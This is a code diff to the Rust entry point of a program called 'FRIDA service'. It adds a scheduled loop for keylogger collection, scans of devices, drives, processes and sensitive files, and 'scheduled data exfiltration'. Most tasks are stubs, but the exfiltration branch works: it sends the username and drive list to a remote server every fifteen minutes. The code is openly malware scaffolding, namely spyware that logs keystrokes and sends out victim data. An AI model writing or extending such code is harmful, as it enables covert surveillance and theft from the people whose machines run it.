@@ -66,10 +66,119 @@ async fn main() {
         Ok(_) => Log::info(format!("Data sent successfully.")),
         Err(e) => Log::error(format!("Failed to send data: {}", e)),
     };
-    // Keep the main thread alive to allow the keylogger to run.
-    // In a real scenario, this might be a more complex loop or service.
-    Log::info(format!("Application is running. Press Ctrl+C to exit."));
-    loop {
-        std::thread::sleep(std::time::Duration::from_secs(60));
+    // Service configuration
+    let config = ServiceConfig {
+        keylogger_interval_secs: 60,
+        device_scan_interval_secs: 300,
+        drive_scan_interval_secs: 1800,
+        process_scan_interval_secs: 120,
+        file_scan_interval_secs: 3600,
+        data_exfiltration_interval_secs: 900,
+    };
+
+    Log::info(format!("Starting FRIDA service with configured intervals"));
+    run_service(config, server_url).await;
+}
+
+/// Service configuration parameters
+struct ServiceConfig {
+    keylogger_interval_secs: u64,
+    device_scan_interval_secs: u64,
+    drive_scan_interval_secs: u64,
+    process_scan_interval_secs: u64,
+    file_scan_interval_secs: u64,
+    data_exfiltration_interval_secs: u64,
+}
+
+/// Main service runner with scheduled tasks
+async fn run_service(config: ServiceConfig, server_url: String) {
+    use tokio::time::{interval, Duration};
+    use tokio::signal::ctrl_c;
+    use tokio::select;
+    use std::sync::atomic::{AtomicBool, Ordering};
+    use std::sync::Arc;
+
+    // Set up the shutdown signal
+    let shutdown = Arc::new(AtomicBool::new(false));
+    let shutdown_clone = shutdown.clone();
+    
+    // Spawn a task to handle Ctrl+C
+    tokio::spawn(async move {
+        if let Ok(_) = ctrl_c().await {
+            Log::info(format!("Shutdown signal received"));
+            shutdown_clone.store(true, Ordering::SeqCst);
+        }
+    });
+
+    Log::info(format!("Service started. Press Ctrl+C to exit."));
+
+    // Create intervals for different tasks
+    let mut keylogger_interval = interval(Duration::from_secs(config.keylogger_interval_secs));
+    let mut device_scan_interval = interval(Duration::from_secs(config.device_scan_interval_secs));
+    let mut drive_scan_interval = interval(Duration::from_secs(config.drive_scan_interval_secs));
+    let mut process_scan_interval = interval(Duration::from_secs(config.process_scan_interval_secs));
+    let mut file_scan_interval = interval(Duration::from_secs(config.file_scan_interval_secs));
+    let mut data_exfiltration_interval = interval(Duration::from_secs(config.data_exfiltration_interval_secs));
+
+    // Service main loop
+    while !shutdown.load(Ordering::SeqCst) {
+        select! {
+            _ = keylogger_interval.tick() => {
+                Log::info(format!("Performing keylogger data collection"));
+                // In a full implementation, this would process and save keylogger data
+                // This is already running in a separate thread, so this would just
+                // handle flushing buffers or other maintenance tasks
+            }
+
+            _ = device_scan_interval.tick() => {
+                Log::info(format!("Scanning for connected devices"));
+                // In a full implementation, this would call device_monitor functions
+                // to check for newly connected devices
+            }
+
+            _ = drive_scan_interval.tick() => {
+                Log::info(format!("Scanning drives and storage media"));
+                let drives = drives::list_drives();
+                Log::info(format!("Found {} drives", drives.len()));
+                // Full implementation would process and store this information
+            }
+
+            _ = process_scan_interval.tick() => {
+                Log::info(format!("Monitoring system processes"));
+                // In a full implementation, this would scan running processes
+                // and possibly execute Python scripts for deeper analysis
+            }
+
+            _ = file_scan_interval.tick() => {
+                Log::info(format!("Scanning for sensitive files"));
+                // In a full implementation, this would scan for sensitive files
+                // across user directories as described in the project docs
+            }
+
+            _ = data_exfiltration_interval.tick() => {
+                Log::info(format!("Performing scheduled data exfiltration"));
+                let hostname = drives::sys_info().current_user;
+                let drives = drives::list_drives();
+                
+                let payload = Payload {
+                    hostname,
+                    drives: &drives,
+                };
+                
+                Log::info(format!("Sending data to {}...", server_url));
+                match network::send_to_server(&payload, &server_url).await {
+                    Ok(_) => Log::info(format!("Data sent successfully.")),
+                    Err(e) => Log::error(format!("Failed to send data: {}", e)),
+                };
+            }
+        }
+
+        // Brief sleep to prevent CPU hogging
+        tokio::time::sleep(Duration::from_millis(50)).await;
     }
+
+    // Perform cleanup when service is shutting down
+    Log::info(format!("Service shutting down, performing cleanup..."));
+    // Cleanup code would go here - close files, flush buffers, etc.
+    Log::info(format!("Service shutdown complete"));
 }
